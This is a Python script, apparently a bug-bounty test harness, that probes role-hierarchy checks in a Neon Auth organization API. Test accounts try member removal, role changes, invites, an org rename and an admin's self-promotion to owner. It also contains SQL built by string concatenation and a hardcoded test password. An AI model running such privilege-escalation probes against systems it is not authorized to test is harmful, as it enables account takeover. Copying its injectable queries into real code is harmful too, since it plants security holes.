# -*- coding: utf-8 -*-
"""W4e: org matrix iter3 - role hierarchy checks (member vs admin vs owner).
Key hypothesis from iter2: remove-member error "only owner cannot leave" suggests
the check inspects the TARGET's owner-ness, not the CALLER's role. If so, a plain
member may be able to remove OTHER members (and maybe update their roles).
Users U1(owner) U2(member) U3(member) U4(spare) all self-created.
X-Bug-Bounty: xxbo. DB read-only cross-check.
"""
import json
import ssl
import time
import http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
DB_URI = None
LOG = r"F:\scan\neon_report\_w4e_out.txt"
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"
U3 = "libobo1229+na_org3@gmail.com"
U4 = "libobo1229+na_org4@gmail.com"


def out(s):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), s)
    print(line, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(line + "\n")


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        ctx = ssl.create_default_context()
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.7)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.7)
        return None, str(e)[:150], ""


def signin(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def signup(email):
    st, data, ck = na("POST", "/neondb/auth/sign-up/email",
                      {"email": email, "password": PASS, "name": "w4e-" + email[10:17]})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    try:
        ctx = ssl.create_default_context()
        conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
        conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                     "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                     headers={"X-Bug-Bounty": "xxbo",
                              "Authorization": "Bearer " + APIKEY})
        resp = conn.getresponse()
        data = json.loads(resp.read().decode("utf-8", "replace"))
        conn.close()
        uri = data.get("uri")
        from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
        parts = urlsplit(uri)
        q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
        DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path,
                             urlencode(q), parts.fragment))
        return True
    except Exception as e:
        out("fetch uri err: %s" % str(e)[:120])
        return False


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        with conn.cursor() as cur:
            cur.execute(sql)
            return cur.fetchall()


def uid(email):
    r = dbq('SELECT id FROM neon_auth.user WHERE email=%s' % ("'" + email + "'"))
    return str(r[0][0]) if r else None


def mid(org, email):
    u = uid(email)
    if not u:
        return None
    r = dbq('SELECT id FROM neon_auth.member WHERE "organizationId"=%s AND "userId"=%s'
            % ("'" + org + "'", "'" + u + "'"))
    return str(r[0][0]) if r else None


def org_members(org):
    r = dbq('SELECT m.role, u.email FROM neon_auth.member m JOIN neon_auth.user u '
            'ON u.id=m."userId" WHERE m."organizationId"=%s'
            % ("'" + org + "'"))
    return r


def call(tag, method, path, body, cookie):
    st, data, _ = na(method, path, body, cookie)
    out("%-40s -> %s %s" % (tag, st, data[:230]))
    return st, data


def invite_and_accept(org, owner_ck, email, role="member"):
    st, data, _ = na("POST", "/neondb/auth/organization/invite-member",
                     {"organizationId": org, "email": email, "role": role}, owner_ck)
    out("   invite %s(%s): %s %s" % (email, role, st, data[:200]))
    inv_id = None
    try:
        inv_id = json.loads(data).get("id")
    except Exception:
        pass
    if not inv_id:
        r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s '
                'AND email=%s AND status=%s' % ("'" + org + "'", "'" + email + "'",
                                                "'pending'"))
        inv_id = str(r[0][0]) if r else None
    if inv_id:
        ck = signin(email)
        st, data, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                         {"invitationId": inv_id}, ck)
        out("   accept %s: %s %s" % (email, st, data[:160]))
    return signin(email)


def main():
    out("== W4e org matrix iter3 ==")
    if not fetch_db_uri():
        return
    c1 = signin(U1)
    out("U1 session: %s" % bool(c1))
    # fresh org O2
    st, data, _ = na("POST", "/neondb/auth/organization/create",
                     {"name": "w4e-org", "slug": "w4e-%d" % int(time.time())}, c1)
    org = json.loads(data).get("id") if st == 200 else None
    out("O2 = %s (%s)" % (org, st))
    if not org:
        return
    # add U2, U3 as members; U4 spare
    c2 = invite_and_accept(org, c1, U2)
    c3 = invite_and_accept(org, c1, U3)
    out("members: %s" % org_members(org))

    # ---- member-level probes (U2) ----
    call("A U2 update U3 role->admin", "POST",
         "/neondb/auth/organization/update-member-role",
         {"organizationId": org, "memberId": mid(org, U3), "role": "admin"}, c2)
    call("B U2 remove U3", "POST", "/neondb/auth/organization/remove-member",
         {"organizationId": org, "memberIdOrEmail": mid(org, U3)}, c2)
    call("B2 U2 remove U3 by email", "POST", "/neondb/auth/organization/remove-member",
         {"organizationId": org, "memberIdOrEmail": U3}, c2)
    call("C U2 invite U4", "POST", "/neondb/auth/organization/invite-member",
         {"organizationId": org, "email": U4, "role": "member"}, c2)
    call("D U2 rename org", "POST", "/neondb/auth/organization/rename",
         {"organizationId": org, "name": "w4e-hijack"}, c2)
    out("members after member probes: %s" % org_members(org))

    # ---- owner upgrades U2 to admin ----
    call("ctrl owner promote U2 admin", "POST",
         "/neondb/auth/organization/update-member-role",
         {"organizationId": org, "memberId": mid(org, U2), "role": "admin"}, c1)
    out("members after owner promote: %s" % org_members(org))
    # admin-level probes (U2 as admin)
    call("E admin update U3 role->member", "POST",
         "/neondb/auth/organization/update-member-role",
         {"organizationId": org, "memberId": mid(org, U3), "role": "member"}, c2)
    call("F admin invite U4", "POST", "/neondb/auth/organization/invite-member",
         {"organizationId": org, "email": U4, "role": "member"}, c2)
    call("G admin remove U3", "POST", "/neondb/auth/organization/remove-member",
         {"organizationId": org, "memberIdOrEmail": mid(org, U3)}, c2)
    call("H admin promote self owner", "POST",
         "/neondb/auth/organization/update-member-role",
         {"organizationId": org, "memberId": mid(org, U2), "role": "owner"}, c2)
    out("members after admin probes: %s" % org_members(org))

    # ---- cleanup ----
    call("cleanup delete O2", "POST", "/neondb/auth/organization/delete",
         {"organizationId": org}, c1)
    out("== W4e DONE")


if __name__ == "__main__":
    main()
